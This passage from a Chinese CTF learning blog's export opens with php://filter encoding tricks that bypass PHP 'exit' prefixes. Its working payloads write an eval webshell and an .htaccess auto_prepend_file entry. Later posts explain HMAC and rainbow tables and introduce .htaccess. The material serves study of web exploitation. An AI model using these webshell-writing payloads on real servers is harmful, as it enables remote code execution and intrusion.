alt=\"12.png\"></p>\n<p>可以看到成功写入，并且将前面的死亡代码糅杂消失。</p>\n<h4 id=\"利用usc-4\"><a href=\"#利用usc-4\" class=\"headerlink\" title=\"利用usc-4\"></a>利用usc-4</h4><p>和usc-2原理基本一致，不过这里是四位一反转。</p>\n<p><code>?content=php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@%20p(lavOP_$s[TS]pm1&gt;?;)/resource=10.php</code></p>\n<h4 id=\"utf-8、utf-7转换\"><a href=\"#utf-8、utf-7转换\" class=\"headerlink\" title=\"utf-8、utf-7转换\"></a>utf-8、utf-7转换</h4><p>测试发现：</p>\n<p><img src=\"https://i.loli.net/2020/12/04/FZmGyCQb5MfnAvO.png\" alt=\"13.png\"></p>\n<p>等号经过<code>utf-7</code>编码后会变成 +AD0- ，这样就可以消除等号的影响。并且：</p>\n<p><img src=\"https://i.loli.net/2020/12/04/uWVSQyApnEH58hF.png\" alt=\"14.png\"></p>\n<p>纯字符经过 <code>utf-7</code> 编码 ，和原来不会有太大区别，所以可以结合 utf7和base64解码来写马</p>\n<p><code>?content=php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=10.php</code></p>\n<p>本地可以看到已经成功写入：</p>\n<p><img src=\"https://i.loli.net/2020/12/06/CYKxaU7HFZM2diz.png\" alt=\"123.png\"></p>\n<h3 id=\"demo3\"><a href=\"#demo3\" class=\"headerlink\" title=\"demo3\"></a>demo3</h3><pre><code class=\"php\">&lt;?php\n highlight_file(__FILE__);\n $filename=$_GET[&#39;filename&#39;];\n $content=$_GET[&#39;content&#39;];\n file_put_contents($filename,$content . &quot;\\nxxxxxx&quot;);\n?&gt;</code></pre>\n<p>其实可以直接写 <code>?content=&lt;?php phpinfo();?&gt;</code> 但其实题目一般都会有过滤，可能是过滤掉 起始符号 &lt;? ，这个时候我们可以利用 <code>.htaccess</code></p>\n<p>但是 <code>.htaccess</code> 文件，对内容要求很严格，多余冗杂的代码会导致文件失效和错误。所以我们考虑注释符。</p>\n<p>s1mple师傅的payload:</p>\n<p><code>?filename=.htaccess&amp;content=php_value%20auto_prepend_file%20D:\\phpStudy\\PHPTutorial\\WWW\\flag.php%0a%23\\</code></p>\n<p>我自己本地测试发现，在windows下不能使那个换行无效…，而在linux下似乎也不可行。后面有人如果能复现或者自己有思路可以绕过去的，欢迎与我讨论~</p>\n<p>参考链接：</p>\n<p><code>https://xz.aliyun.com/t/8163#toc-2</code></p>\n"},{"layout":"post","title":"2020-12-22-hash-HMAC算法","date":"2020-12-21T16:00:00.000Z","description":"hash-HMAC加密算法","typora-copy-images-to":"..\\img","typora-root-url":"..","_content":"\n# Hmac算法\n\n​\t写题目看到了hash-hmac()加密函数，于是稍微了解一下hmac加密算法，顺便做个笔记，不然学了等于没学，看了也白看。\n\n​\t虽然基本上人人都懂哈希（hash）算法，但说Hmac算法之前还是得简单提一嘴哈希算法：\n\n**哈希算法**（Hash）又称摘要算法（DiHgest），原理是对一组信息数据通过某种函数（这种作用的函数可以统称为哈希函数）进行计算，得到一个固定长度的**信息摘要**。\n\n​\t而通过这个定长的信息摘要，几乎不可能逆推出原始的数据。并且，相同的原始数据得到的信息摘要一定相同，不同的原始数据得到相同摘要的可能性则非常非常小（越长的原始数据，信息摘要相同的可能性越小）。这就使得这个信息摘要几乎具有唯一性，可以用来唯一认证这个原始数据。这个特性可以用在密码验证和保存机制中（机密性），亦可以用来校验信息（完整性）。\n\n​\t例如大部分网站存储用户口令，存储的并不是口令本身，而是口令的哈希值，这样即使黑客通过手段拿到了数据库中用户的哈希口令，也没法通过这个口令登录用户系统。除非使用穷举的方法“碰撞”出哈希值与它相等的口令来。\n\n​\t但黑客也不一定要用暴力穷举的方法破解哈希口令，常用的针对哈希口令的攻击，叫做“彩虹表攻击”。\n\n就是一个预先计算好的常用口令和它们的MD5的对照表：\n\n| 常用口令 | MD5                              |\n| :------- | :------------------------------- |\n| hello123 | f30aa7a662c728b7407c54ae6bfd27d1 |\n| 12345678 | 25d55ad283aa400af464c76d713c07ad |\n| passw0rd | bed128365216c019988915ed3add75fb |\n| 19700101 | 570da6d5277a646f6552b8832012f5dc |\n| …        | …                                |\n| 20201231 | 6879c0ae9117b50074ce0a0d4c843060 |\n\n如果用户使用了以上常见口令，黑客就很容易通过MD5值找到这个口令。\n\n而最简单的抵御彩虹表攻击的方法，是对每个口令额外添加随机数，这个方法称之为加盐（salt）：\n\n```php\n$digest = hash($salt+$inputPassword)\n```\n\n加盐的目的在于使黑客的彩虹表失效，即使用户使用常用口令，也无法从MD5反推原始口令。\n\nHmac算法就是一种基于密钥的消息认证码算法，它的全称是Hash-based Message Authentication Code，是一种更安全的消息摘要算法。\n\nHmac算法总是和某种哈希算法配合起来用的。例如PHP中的hash-hmac()函数的第一个参数就是指定一个哈希函数，如：\"md5\"，\"sha256\"，\"haval160,4\" 等\n\nhash-hmac-algos()函数可以用来返回所有可用的hash()函数，它的返回值是一个由所有可用hash函数名字组成的列表。\n\n------\n\nHMAC算法除了需要信息摘要算法外，还需要一个密钥。HMAC的密钥可以是任何长度，如果密钥的长度超过了摘要算法信息分组的长度，则首先使用摘要算法计算**密钥的摘要**作为新的密钥。一般不建议使用太短的密钥，因为密钥的长度与安全强度是相关的。通常选取密钥长度不小于所选用摘要算法输出的信息摘要的长度。\n\n> HMAC算法本身并不复杂，起需要有一个哈希函数，我们记为**H**。同时还需要有一个密钥，我们记为**K**。每种信息摘要函数都对信息进行分组，每个信息块的长度是固定的，我们记为**B**（如：SHA1为512位，即64字节）。每种信息摘要算法都会输出一个固定长度的信息摘要，我们将信息摘要的长度记为**L**（如MD5为16字节，SHA-1为20个字节）。正如前面所述，K的长度理论上是任意的，一般为了安全强度考虑，选取不小于L的长度。\n\nHMAC算法其实就是利用密钥和明文进行两轮哈希运算，以公式可以表示如下：\n\n```\nHMAC（K，M）=H（K⊕opad∣H（K⊕ipad∣M））\n```\n\n其中：\n\nIpad为0x36重复B次\n\nOpad为0x5c重复B次\n\nM 代表一个消息数据组\n\n### **HMAC算法的运算步骤：**\n\n（1）检查[密钥](https://baike.baidu.com/item/密钥)K的长度。如果K的长度大于B则先使用摘要算法计算出一个长度为L的新密钥。如果后K的长度小于B，则在其后面追加0来使其长度达到B。\n\n（2）将上一步生成的B字长的密钥字符串与ipad做异或运算。\n\n（3）将需要处理的数据流M填充至第二步的结果字符串中。\n\n（4）使用哈希函数H计算上一步中生成的数据流的信息摘要值。\n\n（5）将第一步生成的B[字长](https://baike.baidu.com/item/字长)密钥字符串与opad做异或运算。\n\n（6）再将第四步得到的结果填充到第五步的结果之后。\n\n由上述描述过程，我们知道HMAC算法的计算过程实际是对原始数据做了两次**类似于**加盐处理的哈希加密过程。\n\n","source":"_posts/2020-12-22-hash-HMAC算法.md","raw":"---\nlayout: post\ntitle: 2020-12-22-hash-HMAC算法\ndate: 2020-12-22\ncategories: blog\ntags: [密码学,哈希]\ndescription: hash-HMAC加密算法\ntypora-copy-images-to: ..\\img\ntypora-root-url: ..\n---\n\n# Hmac算法\n\n​\t写题目看到了hash-hmac()加密函数，于是稍微了解一下hmac加密算法，顺便做个笔记，不然学了等于没学，看了也白看。\n\n​\t虽然基本上人人都懂哈希（hash）算法，但说Hmac算法之前还是得简单提一嘴哈希算法：\n\n**哈希算法**（Hash）又称摘要算法（DiHgest），原理是对一组信息数据通过某种函数（这种作用的函数可以统称为哈希函数）进行计算，得到一个固定长度的**信息摘要**。\n\n​\t而通过这个定长的信息摘要，几乎不可能逆推出原始的数据。并且，相同的原始数据得到的信息摘要一定相同，不同的原始数据得到相同摘要的可能性则非常非常小（越长的原始数据，信息摘要相同的可能性越小）。这就使得这个信息摘要几乎具有唯一性，可以用来唯一认证这个原始数据。这个特性可以用在密码验证和保存机制中（机密性），亦可以用来校验信息（完整性）。\n\n​\t例如大部分网站存储用户口令，存储的并不是口令本身，而是口令的哈希值，这样即使黑客通过手段拿到了数据库中用户的哈希口令，也没法通过这个口令登录用户系统。除非使用穷举的方法“碰撞”出哈希值与它相等的口令来。\n\n​\t但黑客也不一定要用暴力穷举的方法破解哈希口令，常用的针对哈希口令的攻击，叫做“彩虹表攻击”。\n\n就是一个预先计算好的常用口令和它们的MD5的对照表：\n\n| 常用口令 | MD5                              |\n| :------- | :------------------------------- |\n| hello123 | f30aa7a662c728b7407c54ae6bfd27d1 |\n| 12345678 | 25d55ad283aa400af464c76d713c07ad |\n| passw0rd | bed128365216c019988915ed3add75fb |\n| 19700101 | 570da6d5277a646f6552b8832012f5dc |\n| …        | …                                |\n| 20201231 | 6879c0ae9117b50074ce0a0d4c843060 |\n\n如果用户使用了以上常见口令，黑客就很容易通过MD5值找到这个口令。\n\n而最简单的抵御彩虹表攻击的方法，是对每个口令额外添加随机数，这个方法称之为加盐（salt）：\n\n```php\n$digest = hash($salt+$inputPassword)\n```\n\n加盐的目的在于使黑客的彩虹表失效，即使用户使用常用口令，也无法从MD5反推原始口令。\n\nHmac算法就是一种基于密钥的消息认证码算法，它的全称是Hash-based Message Authentication Code，是一种更安全的消息摘要算法。\n\nHmac算法总是和某种哈希算法配合起来用的。例如PHP中的hash-hmac()函数的第一个参数就是指定一个哈希函数，如：\"md5\"，\"sha256\"，\"haval160,4\" 等\n\nhash-hmac-algos()函数可以用来返回所有可用的hash()函数，它的返回值是一个由所有可用hash函数名字组成的列表。\n\n------\n\nHMAC算法除了需要信息摘要算法外，还需要一个密钥。HMAC的密钥可以是任何长度，如果密钥的长度超过了摘要算法信息分组的长度，则首先使用摘要算法计算**密钥的摘要**作为新的密钥。一般不建议使用太短的密钥，因为密钥的长度与安全强度是相关的。通常选取密钥长度不小于所选用摘要算法输出的信息摘要的长度。\n\n> HMAC算法本身并不复杂，起需要有一个哈希函数，我们记为**H**。同时还需要有一个密钥，我们记为**K**。每种信息摘要函数都对信息进行分组，每个信息块的长度是固定的，我们记为**B**（如：SHA1为512位，即64字节）。每种信息摘要算法都会输出一个固定长度的信息摘要，我们将信息摘要的长度记为**L**（如MD5为16字节，SHA-1为20个字节）。正如前面所述，K的长度理论上是任意的，一般为了安全强度考虑，选取不小于L的长度。\n\nHMAC算法其实就是利用密钥和明文进行两轮哈希运算，以公式可以表示如下：\n\n```\nHMAC（K，M）=H（K⊕opad∣H（K⊕ipad∣M））\n```\n\n其中：\n\nIpad为0x36重复B次\n\nOpad为0x5c重复B次\n\nM 代表一个消息数据组\n\n### **HMAC算法的运算步骤：**\n\n（1）检查[密钥](https://baike.baidu.com/item/密钥)K的长度。如果K的长度大于B则先使用摘要算法计算出一个长度为L的新密钥。如果后K的长度小于B，则在其后面追加0来使其长度达到B。\n\n（2）将上一步生成的B字长的密钥字符串与ipad做异或运算。\n\n（3）将需要处理的数据流M填充至第二步的结果字符串中。\n\n（4）使用哈希函数H计算上一步中生成的数据流的信息摘要值。\n\n（5）将第一步生成的B[字长](https://baike.baidu.com/item/字长)密钥字符串与opad做异或运算。\n\n（6）再将第四步得到的结果填充到第五步的结果之后。\n\n由上述描述过程，我们知道HMAC算法的计算过程实际是对原始数据做了两次**类似于**加盐处理的哈希加密过程。\n\n","slug":"2020-12-22-hash-HMAC算法","published":1,"updated":"2020-12-22T11:56:08.007Z","comments":1,"photos":[],"link":"","_id":"ckkntx9ke0028xov7yf0ozolb","content":"<h1 id=\"Hmac算法\"><a href=\"#Hmac算法\" class=\"headerlink\" title=\"Hmac算法\"></a>Hmac算法</h1><p>​    写题目看到了hash-hmac()加密函数，于是稍微了解一下hmac加密算法，顺便做个笔记，不然学了等于没学，看了也白看。</p>\n<p>​    虽然基本上人人都懂哈希（hash）算法，但说Hmac算法之前还是得简单提一嘴哈希算法：</p>\n<p><strong>哈希算法</strong>（Hash）又称摘要算法（DiHgest），原理是对一组信息数据通过某种函数（这种作用的函数可以统称为哈希函数）进行计算，得到一个固定长度的<strong>信息摘要</strong>。</p>\n<p>​    而通过这个定长的信息摘要，几乎不可能逆推出原始的数据。并且，相同的原始数据得到的信息摘要一定相同，不同的原始数据得到相同摘要的可能性则非常非常小（越长的原始数据，信息摘要相同的可能性越小）。这就使得这个信息摘要几乎具有唯一性，可以用来唯一认证这个原始数据。这个特性可以用在密码验证和保存机制中（机密性），亦可以用来校验信息（完整性）。</p>\n<p>​    例如大部分网站存储用户口令，存储的并不是口令本身，而是口令的哈希值，这样即使黑客通过手段拿到了数据库中用户的哈希口令，也没法通过这个口令登录用户系统。除非使用穷举的方法“碰撞”出哈希值与它相等的口令来。</p>\n<p>​    但黑客也不一定要用暴力穷举的方法破解哈希口令，常用的针对哈希口令的攻击，叫做“彩虹表攻击”。</p>\n<p>就是一个预先计算好的常用口令和它们的MD5的对照表：</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">常用口令</th>\n<th align=\"left\">MD5</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">hello123</td>\n<td align=\"left\">f30aa7a662c728b7407c54ae6bfd27d1</td>\n</tr>\n<tr>\n<td align=\"left\">12345678</td>\n<td align=\"left\">25d55ad283aa400af464c76d713c07ad</td>\n</tr>\n<tr>\n<td align=\"left\">passw0rd</td>\n<td align=\"left\">bed128365216c019988915ed3add75fb</td>\n</tr>\n<tr>\n<td align=\"left\">19700101</td>\n<td align=\"left\">570da6d5277a646f6552b8832012f5dc</td>\n</tr>\n<tr>\n<td align=\"left\">…</td>\n<td align=\"left\">…</td>\n</tr>\n<tr>\n<td align=\"left\">20201231</td>\n<td align=\"left\">6879c0ae9117b50074ce0a0d4c843060</td>\n</tr>\n</tbody></table>\n<p>如果用户使用了以上常见口令，黑客就很容易通过MD5值找到这个口令。</p>\n<p>而最简单的抵御彩虹表攻击的方法，是对每个口令额外添加随机数，这个方法称之为加盐（salt）：</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token variable\">$digest</span> <span class=\"token operator\">=</span> <span class=\"token function\">hash</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$salt</span><span class=\"token operator\">+</span><span class=\"token variable\">$inputPassword</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>加盐的目的在于使黑客的彩虹表失效，即使用户使用常用口令，也无法从MD5反推原始口令。</p>\n<p>Hmac算法就是一种基于密钥的消息认证码算法，它的全称是Hash-based Message Authentication Code，是一种更安全的消息摘要算法。</p>\n<p>Hmac算法总是和某种哈希算法配合起来用的。例如PHP中的hash-hmac()函数的第一个参数就是指定一个哈希函数，如：”md5”，”sha256”，”haval160,4” 等</p>\n<p>hash-hmac-algos()函数可以用来返回所有可用的hash()函数，它的返回值是一个由所有可用hash函数名字组成的列表。</p>\n<hr>\n<p>HMAC算法除了需要信息摘要算法外，还需要一个密钥。HMAC的密钥可以是任何长度，如果密钥的长度超过了摘要算法信息分组的长度，则首先使用摘要算法计算<strong>密钥的摘要</strong>作为新的密钥。一般不建议使用太短的密钥，因为密钥的长度与安全强度是相关的。通常选取密钥长度不小于所选用摘要算法输出的信息摘要的长度。</p>\n<blockquote>\n<p>HMAC算法本身并不复杂，起需要有一个哈希函数，我们记为<strong>H</strong>。同时还需要有一个密钥，我们记为<strong>K</strong>。每种信息摘要函数都对信息进行分组，每个信息块的长度是固定的，我们记为<strong>B</strong>（如：SHA1为512位，即64字节）。每种信息摘要算法都会输出一个固定长度的信息摘要，我们将信息摘要的长度记为<strong>L</strong>（如MD5为16字节，SHA-1为20个字节）。正如前面所述，K的长度理论上是任意的，一般为了安全强度考虑，选取不小于L的长度。</p>\n</blockquote>\n<p>HMAC算法其实就是利用密钥和明文进行两轮哈希运算，以公式可以表示如下：</p>\n<pre><code>HMAC（K，M）=H（K⊕opad∣H（K⊕ipad∣M））</code></pre><p>其中：</p>\n<p>Ipad为0x36重复B次</p>\n<p>Opad为0x5c重复B次</p>\n<p>M 代表一个消息数据组</p>\n<h3 id=\"HMAC算法的运算步骤：\"><a href=\"#HMAC算法的运算步骤：\" class=\"headerlink\" title=\"HMAC算法的运算步骤：\"></a><strong>HMAC算法的运算步骤：</strong></h3><p>（1）检查<a href=\"https://baike.baidu.com/item/密钥\" target=\"_blank\" rel=\"noopener\">密钥</a>K的长度。如果K的长度大于B则先使用摘要算法计算出一个长度为L的新密钥。如果后K的长度小于B，则在其后面追加0来使其长度达到B。</p>\n<p>（2）将上一步生成的B字长的密钥字符串与ipad做异或运算。</p>\n<p>（3）将需要处理的数据流M填充至第二步的结果字符串中。</p>\n<p>（4）使用哈希函数H计算上一步中生成的数据流的信息摘要值。</p>\n<p>（5）将第一步生成的B<a href=\"https://baike.baidu.com/item/字长\" target=\"_blank\" rel=\"noopener\">字长</a>密钥字符串与opad做异或运算。</p>\n<p>（6）再将第四步得到的结果填充到第五步的结果之后。</p>\n<p>由上述描述过程，我们知道HMAC算法的计算过程实际是对原始数据做了两次<strong>类似于</strong>加盐处理的哈希加密过程。</p>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<h1 id=\"Hmac算法\"><a href=\"#Hmac算法\" class=\"headerlink\" title=\"Hmac算法\"></a>Hmac算法</h1><p>​    写题目看到了hash-hmac()加密函数，于是稍微了解一下hmac加密算法，顺便做个笔记，不然学了等于没学，看了也白看。</p>\n<p>​    虽然基本上人人都懂哈希（hash）算法，但说Hmac算法之前还是得简单提一嘴哈希算法：</p>\n<p><strong>哈希算法</strong>（Hash）又称摘要算法（DiHgest），原理是对一组信息数据通过某种函数（这种作用的函数可以统称为哈希函数）进行计算，得到一个固定长度的<strong>信息摘要</strong>。</p>\n<p>​    而通过这个定长的信息摘要，几乎不可能逆推出原始的数据。并且，相同的原始数据得到的信息摘要一定相同，不同的原始数据得到相同摘要的可能性则非常非常小（越长的原始数据，信息摘要相同的可能性越小）。这就使得这个信息摘要几乎具有唯一性，可以用来唯一认证这个原始数据。这个特性可以用在密码验证和保存机制中（机密性），亦可以用来校验信息（完整性）。</p>\n<p>​    例如大部分网站存储用户口令，存储的并不是口令本身，而是口令的哈希值，这样即使黑客通过手段拿到了数据库中用户的哈希口令，也没法通过这个口令登录用户系统。除非使用穷举的方法“碰撞”出哈希值与它相等的口令来。</p>\n<p>​    但黑客也不一定要用暴力穷举的方法破解哈希口令，常用的针对哈希口令的攻击，叫做“彩虹表攻击”。</p>\n<p>就是一个预先计算好的常用口令和它们的MD5的对照表：</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">常用口令</th>\n<th align=\"left\">MD5</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">hello123</td>\n<td align=\"left\">f30aa7a662c728b7407c54ae6bfd27d1</td>\n</tr>\n<tr>\n<td align=\"left\">12345678</td>\n<td align=\"left\">25d55ad283aa400af464c76d713c07ad</td>\n</tr>\n<tr>\n<td align=\"left\">passw0rd</td>\n<td align=\"left\">bed128365216c019988915ed3add75fb</td>\n</tr>\n<tr>\n<td align=\"left\">19700101</td>\n<td align=\"left\">570da6d5277a646f6552b8832012f5dc</td>\n</tr>\n<tr>\n<td align=\"left\">…</td>\n<td align=\"left\">…</td>\n</tr>\n<tr>\n<td align=\"left\">20201231</td>\n<td align=\"left\">6879c0ae9117b50074ce0a0d4c843060</td>\n</tr>\n</tbody></table>\n<p>如果用户使用了以上常见口令，黑客就很容易通过MD5值找到这个口令。</p>\n<p>而最简单的抵御彩虹表攻击的方法，是对每个口令额外添加随机数，这个方法称之为加盐（salt）：</p>\n<pre><code class=\"php\">$digest = hash($salt+$inputPassword)</code></pre>\n<p>加盐的目的在于使黑客的彩虹表失效，即使用户使用常用口令，也无法从MD5反推原始口令。</p>\n<p>Hmac算法就是一种基于密钥的消息认证码算法，它的全称是Hash-based Message Authentication Code，是一种更安全的消息摘要算法。</p>\n<p>Hmac算法总是和某种哈希算法配合起来用的。例如PHP中的hash-hmac()函数的第一个参数就是指定一个哈希函数，如：”md5”，”sha256”，”haval160,4” 等</p>\n<p>hash-hmac-algos()函数可以用来返回所有可用的hash()函数，它的返回值是一个由所有可用hash函数名字组成的列表。</p>\n<hr>\n<p>HMAC算法除了需要信息摘要算法外，还需要一个密钥。HMAC的密钥可以是任何长度，如果密钥的长度超过了摘要算法信息分组的长度，则首先使用摘要算法计算<strong>密钥的摘要</strong>作为新的密钥。一般不建议使用太短的密钥，因为密钥的长度与安全强度是相关的。通常选取密钥长度不小于所选用摘要算法输出的信息摘要的长度。</p>\n<blockquote>\n<p>HMAC算法本身并不复杂，起需要有一个哈希函数，我们记为<strong>H</strong>。同时还需要有一个密钥，我们记为<strong>K</strong>。每种信息摘要函数都对信息进行分组，每个信息块的长度是固定的，我们记为<strong>B</strong>（如：SHA1为512位，即64字节）。每种信息摘要算法都会输出一个固定长度的信息摘要，我们将信息摘要的长度记为<strong>L</strong>（如MD5为16字节，SHA-1为20个字节）。正如前面所述，K的长度理论上是任意的，一般为了安全强度考虑，选取不小于L的长度。</p>\n</blockquote>\n<p>HMAC算法其实就是利用密钥和明文进行两轮哈希运算，以公式可以表示如下：</p>\n<pre><code>HMAC（K，M）=H（K⊕opad∣H（K⊕ipad∣M））</code></pre><p>其中：</p>\n<p>Ipad为0x36重复B次</p>\n<p>Opad为0x5c重复B次</p>\n<p>M 代表一个消息数据组</p>\n<h3 id=\"HMAC算法的运算步骤：\"><a href=\"#HMAC算法的运算步骤：\" class=\"headerlink\" title=\"HMAC算法的运算步骤：\"></a><strong>HMAC算法的运算步骤：</strong></h3><p>（1）检查<a href=\"https://baike.baidu.com/item/密钥\" target=\"_blank\" rel=\"noopener\">密钥</a>K的长度。如果K的长度大于B则先使用摘要算法计算出一个长度为L的新密钥。如果后K的长度小于B，则在其后面追加0来使其长度达到B。</p>\n<p>（2）将上一步生成的B字长的密钥字符串与ipad做异或运算。</p>\n<p>（3）将需要处理的数据流M填充至第二步的结果字符串中。</p>\n<p>（4）使用哈希函数H计算上一步中生成的数据流的信息摘要值。</p>\n<p>（5）将第一步生成的B<a href=\"https://baike.baidu.com/item/字长\" target=\"_blank\" rel=\"noopener\">字长</a>密钥字符串与opad做异或运算。</p>\n<p>（6）再将第四步得到的结果填充到第五步的结果之后。</p>\n<p>由上述描述过程，我们知道HMAC算法的计算过程实际是对原始数据做了两次<strong>类似于</strong>加盐处理的哈希加密过程。</p>\n"},{"layout":"post","title":".htaccess文件","date":"2020-12-22T16:00:00.000Z","description":".htaccess文件作用与用法浅析","typora-copy-images-to":"..\\img","typora-root-url":"..","_content":"\n# .htaccess文件\n\n**.htaccess是在Apache HTTP Server这款服务器架设软件下的一个对于系统目录进行各种权限规则设置的一个文件**，存在于Linux操作系统中。\n\n.htaccess是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。\n\n可以帮我们实现：网页 301 重定向、自定义 404 错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。\n\nApache的标准配置文件是httpd.conf,但这是Apache的配置文件，一旦修改，改的是网络服务器的全局配置。","source":"_posts/2020-12-23-Apache的.htaccess文件.md","raw":"---\nlayout: post\ntitle: .htaccess文件\ndate: 2020-12-23\ncategories: blog\ntags: [web,php]\ndescription: .htaccess文件作用与用法浅析\ntypora-copy-images-to: ..\\img\ntypora-root-url: ..\n---\n\n# .htaccess文件\n\n**.htaccess是在Apache HTTP Server这款服务器架设软件下的一个对于系统目录进行各种权限规则设置的一个文件**，存在于Linux操作系统中。\n\n.htaccess是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。\n\n可以帮我们实现：网页 301 重定向、自定义 404 错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。\n\nApache的标准配置文件是httpd.conf,但这是Apache的配置文件，一旦修改，改的是网络服务器的全局配置。","slug":"2020-12-23-Apache的.htaccess文件","published":1,"updated":"2021-01-12T07:14:13.926Z","comments":1,"photos":[],"link":"","_id":"ckkntx9kg002bxov7gi7i5pnj","content":"<h1 id=\"htaccess文件\"><a href=\"#htaccess文件\" class=\"headerlink\" title=\".htaccess文件\"></a>.htaccess文件</h1><p><strong>.htaccess是在Apache HTTP Server这款服务器架设软件下的一个对于系统目录进行各种权限规则设置的一个文件</strong>，存在于Linux操作系统中。</p>\n<p>.htaccess是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。</p>\n<p>可以帮我们实现：网页 301 重定向、自定义 404 错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>\n<p>Apache的标准配置文件是httpd.conf,但这是Apache的配置文件，一旦修改，改的是网络服务器的全局配置。</p>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You 